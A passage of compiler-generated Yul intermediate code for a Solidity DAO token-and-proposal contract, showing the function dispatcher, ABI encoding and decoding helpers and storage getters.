                                external_fun_transferFrom_2_2644()
                            }

                            case 0xeceb2945
                            {
                                // checkProposalCode(uint256,address,uint256,bytes)

                                external_fun_checkProposalCode_1484()
                            }

                            case 0xf8c80d26
                            {
                                // privateCreation()

                                external_fun_privateCreation_383()
                            }

                            default {}
                        }


                        // if callvalue() { revert_error_ca66f745a3ce8ff40e2ccaf1ad45db7774001b90d25810abd9040049be7bf4bb() }

                        let retval := fun__1210(0, calldatasize())
                                                
                        return(add(retval, 0x20), mload(retval))

                        function shift_right_224_unsigned(value) -> newValue {
                            newValue :=

                            shr(224, value)

                        }

                        function allocate_unbounded() -> memPtr {
                            memPtr := mload(64)
                        }

                        function revert_error_ca66f745a3ce8ff40e2ccaf1ad45db7774001b90d25810abd9040049be7bf4bb() {
                            // FLAG: THIS IS REVERTED ON CALL
                            revert(0, 0)
                        }

                        function revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() {
                            revert(0, 0)
                        }

                        function revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db() {
                            revert(0, 0)
                        }

                        function cleanup_t_uint256(value) -> cleaned {
                            cleaned := value
                        }

                        function validator_revert_t_uint256(value) {
                            if iszero(eq(value, cleanup_t_uint256(value))) { revert(0, 0) }
                        }

                        function abi_decode_t_uint256(offset, end) -> value {
                            value := calldataload(offset)
                            validator_revert_t_uint256(value)
                        }

                        function abi_decode_tuple_t_uint256(headStart, dataEnd) -> value0 {
                            if slt(sub(dataEnd, headStart), 32) { revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() }

                            {

                                let offset := 0

                                value0 := abi_decode_t_uint256(add(headStart, offset), dataEnd)
                            }

                        }

                        function panic_error_0x32() {
                            mstore(0, 35408467139433450592217433187231851964531694900788300625387963629091585785856)
                            mstore(4, 0x32)
                            revert(0, 0x24)
                        }

                        function array_length_t_array$_t_struct$_Proposal_$800_storage_$dyn_storage(value) -> length {

                            length := sload(value)

                        }

                        function array_dataslot_t_array$_t_struct$_Proposal_$800_storage_$dyn_storage(ptr) -> data {
                            data := ptr

                            mstore(0, ptr)
                            data := keccak256(0, 0x20)

                        }

                        function array_dataslot_t_bytes_storage_ptr(ptr) -> data {
                            data := ptr

                            mstore(0, ptr)
                            data := keccak256(0, 0x20)

                        }

                        function long_byte_array_index_access_no_checks(array, index) -> slot, offset {

                            offset := sub(31, mod(index, 0x20))
                            let dataArea := array_dataslot_t_bytes_storage_ptr(array)
                            slot := add(dataArea, div(index, 0x20))

                        }

                        function storage_array_index_access_t_array$_t_struct$_Proposal_$800_storage_$dyn_storage(array, index) -> slot, offset {
                            let arrayLength := array_length_t_array$_t_struct$_Proposal_$800_storage_$dyn_storage(array)
                            if iszero(lt(index, arrayLength)) { panic_error_0x32() }

                            let dataArea := array_dataslot_t_array$_t_struct$_Proposal_$800_storage_$dyn_storage(array)
                            slot := add(dataArea, mul(index, 14))
                            offset := 0

                        }

                        function shift_right_0_unsigned(value) -> newValue {
                            newValue :=

                            shr(0, value)

                        }

                        function cleanup_from_storage_t_address(value) -> cleaned {
                            cleaned := and(value, 0xffffffffffffffffffffffffffffffffffffffff)
                        }

                        function extract_from_storage_value_offset_0_t_address(slot_value) -> value {
                            value := cleanup_from_storage_t_address(shift_right_0_unsigned(slot_value))
                        }

                        function read_from_storage_split_offset_0_t_address(slot) -> value {
                            value := extract_from_storage_value_offset_0_t_address(sload(slot))

                        }

                        function cleanup_from_storage_t_uint256(value) -> cleaned {
                            cleaned := value
                        }

                        function extract_from_storage_value_offset_0_t_uint256(slot_value) -> value {
                            value := cleanup_from_storage_t_uint256(shift_right_0_unsigned(slot_value))
                        }

                        function read_from_storage_split_offset_0_t_uint256(slot) -> value {
                            value := extract_from_storage_value_offset_0_t_uint256(sload(slot))

                        }

                        function panic_error_0x22() {
                            mstore(0, 35408467139433450592217433187231851964531694900788300625387963629091585785856)
                            mstore(4, 0x22)
                            revert(0, 0x24)
                        }

                        function extract_byte_array_length(data) -> length {
                            length := div(data, 2)
                            let outOfPlaceEncoding := and(data, 1)
                            if iszero(outOfPlaceEncoding) {
                                length := and(length, 0x7f)
                            }

                            if eq(outOfPlaceEncoding, lt(length, 32)) {
                                panic_error_0x22()
                            }
                        }

                        function array_storeLengthForEncoding_t_string_memory_ptr(pos, length) -> updated_pos {
                            mstore(pos, length)
                            updated_pos := add(pos, 0x20)
                        }

                        function array_dataslot_t_string_storage(ptr) -> data {
                            data := ptr

                            mstore(0, ptr)
                            data := keccak256(0, 0x20)

                        }

                        // string -> string
                        function abi_encode_t_string_storage_to_t_string_memory_ptr(value, pos) -> ret {
                            let slotValue := sload(value)
                            let length := extract_byte_array_length(slotValue)
                            pos := array_storeLengthForEncoding_t_string_memory_ptr(pos, length)
                            switch and(slotValue, 1)
                            case 0 {
                                // short byte array
                                mstore(pos, and(slotValue, not(0xff)))
                                ret := add(pos, mul(0x20, iszero(iszero(length))))
                            }
                            case 1 {
                                // long byte array
                                let dataPos := array_dataslot_t_string_storage(value)
                                let i := 0
                                for { } lt(i, length) { i := add(i, 0x20) } {
                                    mstore(add(pos, i), sload(dataPos))
                                    dataPos := add(dataPos, 1)
                                }
                                ret := add(pos, i)
                            }
                        }

                        function abi_encodeUpdatedPos_t_string_storage_to_t_string_memory_ptr(value0, pos) -> updatedPos {
                            updatedPos := abi_encode_t_string_storage_to_t_string_memory_ptr(value0, pos)
                        }

                        function round_up_to_mul_of_32(value) -> result {
                            result := and(add(value, 31), not(31))
                        }

                        function panic_error_0x41() {
                            mstore(0, 35408467139433450592217433187231851964531694900788300625387963629091585785856)
                            mstore(4, 0x41)
                            revert(0, 0x24)
                        }

                        function finalize_allocation(memPtr, size) {
                            let newFreePtr := add(memPtr, round_up_to_mul_of_32(size))
                            // protect against overflow
                            if or(gt(newFreePtr, 0xffffffffffffffff), lt(newFreePtr, memPtr)) { panic_error_0x41() }
                            mstore(64, newFreePtr)
                        }

                        function copy_array_from_storage_to_memory_t_string_storage(slot) -> memPtr {
                            memPtr := allocate_unbounded()
                            let end := abi_encodeUpdatedPos_t_string_storage_to_t_string_memory_ptr(slot, memPtr)
                            finalize_allocation(memPtr, sub(end, memPtr))
                        }

                        function cleanup_from_storage_t_bool(value) -> cleaned {
                            cleaned := and(value, 0xff)
                        }

                        function extract_from_storage_value_offset_0_t_bool(slot_value) -> value {
                            value := cleanup_from_storage_t_bool(shift_right_0_unsigned(slot_value))
                        }

                        function read_from_storage_split_offset_0_t_bool(slot) -> value {
                            value := extract_from_storage_value_offset_0_t_bool(sload(slot))

                        }

                        function shift_right_8_unsigned(value) -> newValue {
                            newValue :=

                            shr(8, value)

                        }

                        function extract_from_storage_value_offset_1_t_bool(slot_value) -> value {
                            value := cleanup_from_storage_t_bool(shift_right_8_unsigned(slot_value))
                        }

                        function read_from_storage_split_offset_1_t_bool(slot) -> value {
                            value := extract_from_storage_value_offset_1_t_bool(sload(slot))

                        }

                        function cleanup_from_storage_t_bytes32(value) -> cleaned {
                            cleaned := value
                        }

                        function extract_from_storage_value_offset_0_t_bytes32(slot_value) -> value {
                            value := cleanup_from_storage_t_bytes32(shift_right_0_unsigned(slot_value))
                        }

                        function read_from_storage_split_offset_0_t_bytes32(slot) -> value {
                            value := extract_from_storage_value_offset_0_t_bytes32(sload(slot))

                        }

                        function cleanup_from_storage_t_address_payable(value) -> cleaned {
                            cleaned := and(value, 0xffffffffffffffffffffffffffffffffffffffff)
                        }

                        function extract_from_storage_value_offset_0_t_address_payable(slot_value) -> value {
                            value := cleanup_from_storage_t_address_payable(shift_right_0_unsigned(slot_value))
                        }

                        function read_from_storage_split_offset_0_t_address_payable(slot) -> value {
                            value := extract_from_storage_value_offset_0_t_address_payable(sload(slot))

                        }

                        /// @ast-id 722
                        /// @src 0:15374:15401  "Proposal[] public proposals"
                        function getter_fun_proposals_722(key_0) -> ret_0, ret_1, ret_2_mpos, ret_3, ret_4, ret_5, ret_6, ret_7, ret_8, ret_9, ret_10, ret_11 {

                            let slot := 8
                            let offset := 0

                            if iszero(lt(key_0, array_length_t_array$_t_struct$_Proposal_$800_storage_$dyn_storage(slot))) { revert(0, 0) }
                            slot, offset := storage_array_index_access_t_array$_t_struct$_Proposal_$800_storage_$dyn_storage(slot, key_0)

                            ret_0 := read_from_storage_split_offset_0_t_address(add(slot, 0))
                            
                            ret_1 := read_from_storage_split_offset_0_t_uint256(add(slot, 1))

                            ret_2_mpos := copy_array_from_storage_to_memory_t_string_storage(add(slot, 2))

                            ret_3 := read_from_storage_split_offset_0_t_uint256(add(slot, 3))

                            ret_4 := read_from_storage_split_offset_0_t_bool(add(slot, 4))

                            ret_5 := read_from_storage_split_offset_1_t_bool(add(slot, 4))

                            ret_6 := read_from_storage_split_offset_0_t_bytes32(add(slot, 5))

                            ret_7 := read_from_storage_split_offset_0_t_uint256(add(slot, 6))

                            ret_8 := read_from_storage_split_offset_0_t_bool(add(slot, 7))

                            ret_9 := read_from_storage_split_offset_0_t_uint256(add(slot, 9))

                            ret_10 := read_from_storage_split_offset_0_t_uint256(add(slot, 10))

                            ret_11 := read_from_storage_split_offset_0_t_address_payable(add(slot, 13))

                        }
                        /// @src 0:29431:47042  "contract DAO is DAOInterface, TokenCreation {..."

                        function cleanup_t_uint160(value) -> cleaned {
                            cleaned := and(value, 0xffffffffffffffffffffffffffffffffffffffff)
                        }

                        function cleanup_t_address(value) -> cleaned {
                            cleaned := cleanup_t_uint160(value)
                        }

                        function abi_encode_t_address_to_t_address_fromStack(value, pos) {
                            mstore(pos, cleanup_t_address(value))
                        }

                        function abi_encode_t_uint256_to_t_uint256_fromStack(value, pos) {
                            mstore(pos, cleanup_t_uint256(value))
                        }

                        function array_length_t_string_memory_ptr(value) -> length {

                            length := mload(value)

                        }

                        function array_storeLengthForEncoding_t_string_memory_ptr_fromStack(pos, length) -> updated_pos {
                            mstore(pos, length)
                            updated_pos := add(pos, 0x20)
                        }

                        function copy_memory_to_memory_with_cleanup(src, dst, length) {

                            mcopy(dst, src, length)
                            mstore(add(dst, length), 0)

                        }

                        function abi_encode_t_string_memory_ptr_to_t_string_memory_ptr_fromStack(value, pos) -> end {
                            let length := array_length_t_string_memory_ptr(value)
                            pos := array_storeLengthForEncoding_t_string_memory_ptr_fromStack(pos, length)
                            copy_memory_to_memory_with_cleanup(add(value, 0x20), pos, length)
                            end := add(pos, round_up_to_mul_of_32(length))
                        }

                        function cleanup_t_bool(value) -> cleaned {
                            cleaned := iszero(iszero(value))
                        }

                        function abi_encode_t_bool_to_t_bool_fromStack(value, pos) {
                            mstore(pos, cleanup_t_bool(value))
                        }

                        function cleanup_t_bytes32(value) -> cleaned {
                            cleaned := value
                        }

                        function abi_encode_t_bytes32_to_t_bytes32_fromStack(value, pos) {
                            mstore(pos, cleanup_t_bytes32(value))
                        }

                        function cleanup_t_address_payable(value) -> cleaned {
                            cleaned := cleanup_t_uint160(value)
                        }

                        function abi_encode_t_address_payable_to_t_address_payable_fromStack(value, pos) {
                            mstore(pos, cleanup_t_address_payable(value))
                        }

                        function abi_encode_tuple_t_address_t_uint256_t_string_memory_ptr_t_uint256_t_bool_t_bool_t_bytes32_t_uint256_t_bool_t_uint256_t_uint256_t_address_payable__to_t_address_t_uint256_t_string_memory_ptr_t_uint256_t_bool_t_bool_t_bytes32_t_uint256_t_bool_t_uint256_t_uint256_t_address_payable__fromStack(headStart , value0, value1, value2, value3, value4, value5, value6, value7, value8, value9, value10, value11) -> tail {
                            tail := add(headStart, 384)

                            abi_encode_t_address_to_t_address_fromStack(value0,  add(headStart, 0))

                            abi_encode_t_uint256_to_t_uint256_fromStack(value1,  add(headStart, 32))

                            mstore(add(headStart, 64), sub(tail, headStart))
                            tail := abi_encode_t_string_memory_ptr_to_t_string_memory_ptr_fromStack(value2,  tail)

                            abi_encode_t_uint256_to_t_uint256_fromStack(value3,  add(headStart, 96))

                            abi_encode_t_bool_to_t_bool_fromStack(value4,  add(headStart, 128))

                            abi_encode_t_bool_to_t_bool_fromStack(value5,  add(headStart, 160))

                            abi_encode_t_bytes32_to_t_bytes32_fromStack(value6,  add(headStart, 192))

                            abi_encode_t_uint256_to_t_uint256_fromStack(value7,  add(headStart, 224))

                            abi_encode_t_bool_to_t_bool_fromStack(value8,  add(headStart, 256))

                            abi_encode_t_uint256_to_t_uint256_fromStack(value9,  add(headStart, 288))

                            abi_encode_t_uint256_to_t_uint256_fromStack(value10,  add(headStart, 320))

                            abi_encode_t_address_payable_to_t_address_payable_fromStack(value11,  add(headStart, 352))

                        }

                        function external_fun_proposals_722() {
                            if callvalue() { revert_error_ca66f745a3ce8ff40e2ccaf1ad45db7774001b90d25810abd9040049be7bf4bb() }
                            let param_0 :=  abi_decode_tuple_t_uint256(4, calldatasize())
                            let ret_0, ret_1, ret_2, ret_3, ret_4, ret_5, ret_6, ret_7, ret_8, ret_9, ret_10, ret_11 :=  getter_fun_proposals_722(param_0)
                            let memPos := allocate_unbounded()
                            let memEnd := abi_encode_tuple_t_address_t_uint256_t_string_memory_ptr_t_uint256_t_bool_t_bool_t_bytes32_t_uint256_t_bool_t_uint256_t_uint256_t_address_payable__to_t_address_t_uint256_t_string_memory_ptr_t_uint256_t_bool_t_bool_t_bytes32_t_uint256_t_bool_t_uint256_t_uint256_t_address_payable__fromStack(memPos , ret_0, ret_1, ret_2, ret_3, ret_4, ret_5, ret_6, ret_7, ret_8, ret_9, ret_10, ret_11)
                            return(memPos, sub(memEnd, memPos))

                        }

                        function validator_revert_t_address(value) {
                            if iszero(eq(value, cleanup_t_address(value))) { revert(0, 0) }
                        }

                        function abi_decode_t_address(offset, end) -> value {
                            value := calldataload(offset)
                            validator_revert_t_address(value)
                        }

                        function abi_decode_tuple_t_addresst_uint256(headStart, dataEnd) -> value0, value1 {
                            if slt(sub(dataEnd, headStart), 64) { revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() }

                            {

                                let offset := 0

                                value0 := abi_decode_t_address(add(headStart, offset), dataEnd)
                            }

                            {

                                let offset := 32

                                value1 := abi_decode_t_uint256(add(headStart, offset), dataEnd)
                            }

                        }

                        function abi_encode_tuple_t_bool__to_t_bool__fromStack(headStart , value0) -> tail {
                            tail := add(headStart, 32)

                            abi_encode_t_bool_to_t_bool_fromStack(value0,  add(headStart, 0))

                        }

                        function external_fun_approve_251() {

                            if callvalue() { revert_error_ca66f745a3ce8ff40e2ccaf1ad45db7774001b90d25810abd9040049be7bf4bb() }
                            let param_0, param_1 :=  abi_decode_tuple_t_addresst_uint256(4, calldatasize())
                            let ret_0 :=  fun_approve_251(param_0, param_1)
                            let memPos := allocate_unbounded()
                            let memEnd := abi_encode_tuple_t_bool__to_t_bool__fromStack(memPos , ret_0)
                            return(memPos, sub(memEnd, memPos))

                        }

                        function abi_decode_tuple_(headStart, dataEnd)   {
                            if slt(sub(dataEnd, headStart), 0) { revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() }

                        }

                        function shift_right_unsigned_dynamic(bits, value) -> newValue {
                            newValue :=

                            shr(bits, value)

                        }

                        function extract_from_storage_value_dynamict_uint256(slot_value, offset) -> value {
                            value := cleanup_from_storage_t_uint256(shift_right_unsigned_dynamic(mul(offset, 8), slot_value))
                        }

                        function read_from_storage_split_dynamic_t_uint256(slot, offset) -> value {
                            value := extract_from_storage_value_dynamict_uint256(sload(slot), offset)

                        }

                        /// @ast-id 379
                        /// @src 0:8732:8761  "uint public minTokensToCreate"
                        function getter_fun_minTokensToCreate_379() -> ret {

                            let slot := 1
                            let offset := 0

                            ret := read_from_storage_split_dynamic_t_uint256(slot, offset)

                        }
                        /// @src 0:29431:47042  "contract DAO is DAOInterface, TokenCreation {..."

                        function abi_encode_tuple_t_uint256__to_t_uint256__fromStack(headStart , value0) -> tail {
                            tail := add(headStart, 32)

                            abi_encode_t_uint256_to_t_uint256_fromStack(value0,  add(headStart, 0))

                        }

                        function external_fun_minTokensToCreate_379() {

                            if callvalue() { revert_error_ca66f745a3ce8ff40e2ccaf1ad45db7774001b90d25810abd9040049be7bf4bb() }
                            abi_decode_tuple_(4, calldatasize())
                            let ret_0 :=  getter_fun_minTokensToCreate_379()
                            let memPos := allocate_unbounded()
                            let memEnd := abi_encode_tuple_t_uint256__to_t_uint256__fromStack(memPos , ret_0)
                            return(memPos, sub(memEnd, memPos))

                        }

                        function cleanup_from_storage_t_contract$_ManagedAccount_$375(value) -> cleaned {
                            cleaned := and(value, 0xffffffffffffffffffffffffffffffffffffffff)
                        }

                        function extract_from_storage_value_dynamict_contract$_ManagedAccount_$375(slot_value, offset) -> value {
                            value := cleanup_from_storage_t_contract$_ManagedAccount_$375(shift_right_unsigned_dynamic(mul(offset, 8), slot_value))
                        }

                        function read_from_storage_split_dynamic_t_contract$_ManagedAccount_$375(slot, offset) -> value {
                            value := extract_from_storage_value_dynamict_contract$_ManagedAccount_$375(sload(slot), offset)

                        }

                        /// @ast-id 741
                        /// @src 0:16401:16436  "ManagedAccount public rewardAccount"
                        function getter_fun_rewardAccount_741() -> ret_address {

                            let slot := 15
                            let offset := 0

                            ret_address := read_from_storage_split_dynamic_t_contract$_ManagedAccount_$375(slot, offset)

                        }
                        /// @src 0:29431:47042  "contract DAO is DAOInterface, TokenCreation {..."

                        function identity(value) -> ret {
                            ret := value
                        }

                        function convert_t_uint160_to_t_uint160(value) -> converted {
                            converted := cleanup_t_uint160(identity(cleanup_t_uint160(value)))
                        }

                        function convert_t_uint160_to_t_address_payable(value) -> converted {
                            converted := convert_t_uint160_to_t_uint160(value)
                        }

                        function convert_t_contract$_ManagedAccount_$375_to_t_address_payable(value) -> converted {
                            converted := convert_t_uint160_to_t_address_payable(value)
                        }

                        function abi_encode_t_contract$_ManagedAccount_$375_to_t_address_payable_fromStack(value, pos) {
                            mstore(pos, convert_t_contract$_ManagedAccount_$375_to_t_address_payable(value))
                        }

                        function abi_encode_tuple_t_contract$_ManagedAccount_$375__to_t_address_payable__fromStack(headStart , value0) -> tail {
                            tail := add(headStart, 32)

                            abi_encode_t_contract$_ManagedAccount_$375_to_t_address_payable_fromStack(value0,  add(headStart, 0))

                        }

                        function external_fun_rewardAccount_741() {

                            if callvalue() { revert_error_ca66f745a3ce8ff40e2ccaf1ad45db7774001b90d25810abd9040049be7bf4bb() }
                            abi_decode_tuple_(4, calldatasize())
                            let ret_0 :=  getter_fun_rewardAccount_741()
                            let memPos := allocate_unbounded()
                            let memEnd := abi_encode_tuple_t_contract$_ManagedAccount_$375__to_t_address_payable__fromStack(memPos , ret_0)
                            return(memPos, sub(memEnd, memPos))

                        }

                        function cleanup_from_storage_t_contract$_DAO_Creator_$3051(value) -> cleaned {
                            cleaned := and(value, 0xffffffffffffffffffffffffffffffffffffffff)
                        }

                        function extract_from_storage_value_dynamict_contract$_DAO_Creator_$3051(slot_value, offset) -> value {
                            value := cleanup_from_storage_t_contract$_DAO_Creator_$3051(shift_right_unsigned_dynamic(mul(offset, 8), slot_value))
                        }

                        function read_from_storage_split_dynamic_t_contract$_DAO_Creator_$3051(slot, offset) -> value {
                            value := extract_from_storage_value_dynamict_contract$_DAO_Creator_$3051(sload(slot), offset)

                        }

                        /// @ast-id 763
                        /// @src 0:17399:17428  "DAO_Creator public daoCreator"
                        function getter_fun_daoCreator_763() -> ret_address {

                            let slot := 22
                            let offset := 0

                            ret_address := read_from_storage_split_dynamic_t_contract$_DAO_Creator_$3051(slot, offset)

                        }
                        /// @src 0:29431:47042  "contract DAO is DAOInterface, TokenCreation {..."

                        function convert_t_uint160_to_t_address(value) -> converted {
                            converted := convert_t_uint160_to_t_uint160(value)
                        }

                        function convert_t_contract$_DAO_Creator_$3051_to_t_address(value) -> converted {
                            converted := convert_t_uint160_to_t_address(value)
                        }

                        function abi_encode_t_contract$_DAO_Creator_$3051_to_t_address_fromStack(value, pos) {
                            mstore(pos, convert_t_contract$_DAO_Creator_$3051_to_t_address(value))
                        }

                        function abi_encode_tuple_t_contract$_DAO_Creator_$3051__to_t_address__fromStack(headStart , value0) -> tail {
                            tail := add(headStart, 32)

                            abi_encode_t_contract$_DAO_Creator_$3051_to_t_address_fromStack(value0,  add(headStart, 0))

                        }

                        function external_fun_daoCreator_763() {

                            if callvalue() { revert_error_ca66f745a3ce8ff40e2ccaf1ad45db7774001b90d25810abd9040049be7bf4bb() }
                            abi_decode_tuple_(4, calldatasize())
                            let ret_0 :=  getter_fun_daoCreator_763()
                            let memPos := allocate_unbounded()
                            let memEnd := abi_encode_tuple_t_contract$_DAO_Creator_$3051__to_t_address__fromStack(memPos , ret_0)
                            return(memPos, sub(memEnd, memPos))

                        }

                        /// @ast-id 14
                        /// @src 0:1623:1649  "uint256 public totalSupply"
                        function getter_fun_totalSupply_14() -> ret {

                            let slot := 7
                            let offset := 0

                            ret := read_from_storage_split_dynamic_t_uint256(slot, offset)

                        }
                        /// @src 0:29431:47042  "contract DAO is DAOInterface, TokenCreation {..."

                        function external_fun_totalSupply_14() {

                            if callvalue() { revert_error_ca66f745a3ce8ff40e2ccaf1ad45db7774001b90d25810abd9040049be7bf4bb() }
                            abi_decode_tuple_(4, calldatasize())
                            let ret_0 :=  getter_fun_totalSupply_14()
                            let memPos := allocate_unbounded()
                            let memEnd := abi_encode_tuple_t_uint256__to_t_uint256__fromStack(memPos , ret_0)
                            return(memPos, sub(memEnd, memPos))

                        }

                        function external_fun_divisor_694() {

                            if callvalue() { revert_error_ca66f745a3ce8ff40e2ccaf1ad45db7774001b90d25810abd9040049be7bf4bb() }
                            abi_decode_tuple_(4, calldatasize())
                            let ret_0 :=  fun_divisor_694()
                            let memPos := allocate_unbounded()
                            let memEnd := abi_encode_tuple_t_uint256__to_t_uint256__fromStack(memPos , ret_0)
                            return(memPos, sub(memEnd, memPos))

                        }

                        /// @ast-id 386
                        /// @src 0:9181:9215  "ManagedAccount public extraBalance"
                        function getter_fun_extraBalance_386() -> ret_address {

                            let slot := 3
                            let offset := 0

                            ret_address := read_from_storage_split_dynamic_t_contract$_ManagedAccount_$375(slot, offset)

                        }
                        /// @src 0:29431:47042  "contract DAO is DAOInterface, TokenCreation {..."

                        function external_fun_extraBalance_386() {

                            if callvalue() { revert_error_ca66f745a3ce8ff40e2ccaf1ad45db7774001b90d25810abd9040049be7bf4bb() }
                            abi_decode_tuple_(4, calldatasize())
                            let ret_0 :=  getter_fun_extraBalance_386()
                            let memPos := allocate_unbounded()
                            let memEnd := abi_encode_tuple_t_contract$_ManagedAccount_$375__to_t_address_payable__fromStack(memPos , ret_0)
                            return(memPos, sub(memEnd, memPos))

                        }

                        function revert_error_1b9f4a0a5773e33b91aa01db23bf8c55fce1411167c872835e7fa00a4f17d46d() {
                            revert(0, 0)
                        }

                        function revert_error_987264b3b1d58a9c7f8255e93e81c77d86d6299019c33110a076957a3e06e2ae() {
                            revert(0, 0)
                        }

                        function allocate_memory(size) -> memPtr {
                            memPtr := allocate_unbounded()
                            finalize_allocation(memPtr, size)
                        }

                        function array_allocation_size_t_bytes_memory_ptr(length) -> size {
                            // Make sure we can allocate memory without overflow
                            if gt(length, 0xffffffffffffffff) { panic_error_0x41() }

                            size := round_up_to_mul_of_32(length)

                            // add length slot
                            size := add(size, 0x20)

                        }

                        function copy_calldata_to_memory_with_cleanup(src, dst, length) {

                            calldatacopy(dst, src, length)
                            mstore(add(dst, length), 0)

                        }

                        function abi_decode_available_length_t_bytes_memory_ptr(src, length, end) -> array {
                            array := allocate_memory(array_allocation_size_t_bytes_memory_ptr(length))
                            mstore(array, length)
                            let dst := add(array, 0x20)
                            if gt(add(src, length), end) { revert_error_987264b3b1d58a9c7f8255e93e81c77d86d6299019c33110a076957a3e06e2ae() }
                            copy_calldata_to_memory_with_cleanup(src, dst, length)
                        }

                        // bytes
                        function abi_decode_t_bytes_memory_ptr(offset, end) -> array {
                            if iszero(slt(add(offset, 0x1f), end)) { revert_error_1b9f4a0a5773e33b91aa01db23bf8c55fce1411167c872835e7fa00a4f17d46d() }
                            let length := calldataload(offset)
                            array := abi_decode_available_length_t_bytes_memory_ptr(add(offset, 0x20), length, end)
                        }

                        function abi_decode_tuple_t_uint256t_bytes_memory_ptr(headStart, dataEnd) -> value0, value1 {
                            if slt(sub(dataEnd, headStart), 64) { revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() }

                            {

                                let offset := 0

                                value0 := abi_decode_t_uint256(add(headStart, offset), dataEnd)
                            }

                            {

                                let offset := calldataload(add(headStart, 32))
                                if gt(offset, 0xffffffffffffffff) { revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db() }

                                value1 := abi_decode_t_bytes_memory_ptr(add(headStart, offset), dataEnd)
                            }

                        }

                        function external_fun_executeProposal_1911() {
                            if callvalue() { revert_error_ca66f745a3ce8ff40e2ccaf1ad45db7774001b90d25810abd9040049be7bf4bb() }
                            let param_0, param_1 :=  abi_decode_tuple_t_uint256t_bytes_memory_ptr(4, calldatasize())
                            let ret_0 :=  fun_executeProposal_1911(param_0, param_1)
                            let memPos := allocate_unbounded()
                            let memEnd := abi_encode_tuple_t_bool__to_t_bool__fromStack(memPos , ret_0)
                            return(memPos, sub(memEnd, memPos))

                        }

                        function abi_decode_tuple_t_addresst_addresst_uint256(headStart, dataEnd) -> value0, value1, value2 {
                            if slt(sub(dataEnd, headStart), 96) { revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() }

                            {

                                let offset := 0

                                value0 := abi_decode_t_address(add(headStart, offset), dataEnd)
                            }

                            {

                                let offset := 32

                                value1 := abi_decode_t_address(add(headStart, offset), dataEnd)
                            }

                            {

                                let offset := 64

                                value2 := abi_decode_t_uint256(add(headStart, offset), dataEnd)
                            }

                        }

                        function external_fun_transferFrom_222() {

                            if callvalue() { revert_error_ca66f745a3ce8ff40e2ccaf1ad45db7774001b90d25810abd9040049be7bf4bb() }
                            let param_0, param_1, param_2 :=  abi_decode_tuple_t_addresst_addresst_uint256(4, calldatasize())
                            let ret_0 :=  fun_transferFrom_222(param_0, param_1, param_2)
                            let memPos := allocate_unbounded()
                            let memEnd := abi_encode_tuple_t_bool__to_t_bool__fromStack(memPos , ret_0)
                            return(memPos, sub(memEnd, memPos))

                        }

                        function external_fun_unblockMe_3020() {

                            if callvalue() { revert_error_ca66f745a3ce8ff40e2ccaf1ad45db7774001b90d25810abd9040049be7bf4bb() }
                            abi_decode_tuple_(4, calldatasize())
                            let ret_0 :=  fun_unblockMe_3020()
                            let memPos := allocate_unbounded()
                            let memEnd := abi_encode_tuple_t_bool__to_t_bool__fromStack(memPos , ret_0)
                            return(memPos, sub(memEnd, memPos))

                        }

                        /// @ast-id 738
                        /// @src 0:16248:16276  "uint public totalRewardToken"
                        function getter_fun_totalRewardToken_738() -> ret {

                            let slot := 14
                            let offset := 0

                            ret := read_from_storage_split_dynamic_t_uint256(slot, offset)

                        }
                        /// @src 0:29431:47042  "contract DAO is DAOInterface, TokenCreation {..."

                        function external_fun_totalRewardToken_738() {

                            if callvalue() { revert_error_ca66f745a3ce8ff40e2ccaf1ad45db7774001b90d25810abd9040049be7bf4bb() }
                            abi_decode_tuple_(4, calldatasize())
                            let ret_0 :=  getter_fun_totalRewardToken_738()
                            let memPos := allocate_unbounded()
                            let memEnd := abi_encode_tuple_t_uint256__to_t_uint256__fromStack(memPos , ret_0)
                            return(memPos, sub(memEnd, memPos))

                        }

                        function external_fun_actualBalance_2833() {

                            if callvalue() { revert_error_ca66f745a3ce8ff40e2ccaf1ad45db7774001b90d25810abd9040049be7bf4bb() }
                            abi_decode_tuple_(4, calldatasize())
                            let ret_0 :=  fun_actualBalance_2833()
                            let memPos := allocate_unbounded()
                            let memEnd := abi_encode_tuple_t_uint256__to_t_uint256__fromStack(memPos , ret_0)
                            return(memPos, sub(memEnd, memPos))

                        }

                        /// @ast-id 377
                        /// @src 0:8609:8632  "uint public closingTime"
                        function getter_fun_closingTime_377() -> ret {

                            let slot := 0
                            let offset := 0

                            ret := read_from_storage_split_dynamic_t_uint256(slot, offset)

                        }
                        /// @src 0:29431:47042  "contract DAO is DAOInterface, TokenCreation {..."

                        function external_fun_closingTime_377() {

                            if callvalue() { revert_error_ca66f745a3ce8ff40e2ccaf1ad45db7774001b90d25810abd9040049be7bf4bb() }
                            abi_decode_tuple_(4, calldatasize())
                            let ret_0 :=  getter_fun_closingTime_377()
                            let memPos := allocate_unbounded()
                            let memEnd := abi_encode_tuple_t_uint256__to_t_uint256__fromStack(memPos , ret_0)
                            return(memPos, sub(memEnd, memPos))

                        }

                        function abi_decode_tuple_t_address(headStart, dataEnd) -> value0 {
                            if slt(sub(dataEnd, headStart), 32) { revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() }

                            {

                                let offset := 0

                                value0 := abi_decode_t_address(add(headStart, offset), dataEnd)
                            }

                        }

                        function convert_t_address_to_t_address(value) -> converted {
                            converted := convert_t_uint160_to_t_address(value)
                        }

                        function mapping_index_access_t_mapping$_t_address_$_t_bool_$_of_t_address(slot , key) -> dataSlot {
                            mstore(0, convert_t_address_to_t_address(key))
                            mstore(0x20, slot)
                            dataSlot := keccak256(0, 0x40)
                        }

                        function extract_from_storage_value_dynamict_bool(slot_value, offset) -> value {
                            value := cleanup_from_storage_t_bool(shift_right_unsigned_dynamic(mul(offset, 8), slot_value))
                        }

                        function read_from_storage_split_dynamic_t_bool(slot, offset) -> value {
                            value := extract_from_storage_value_dynamict_bool(sload(slot), offset)

                        }

                        /// @ast-id 732
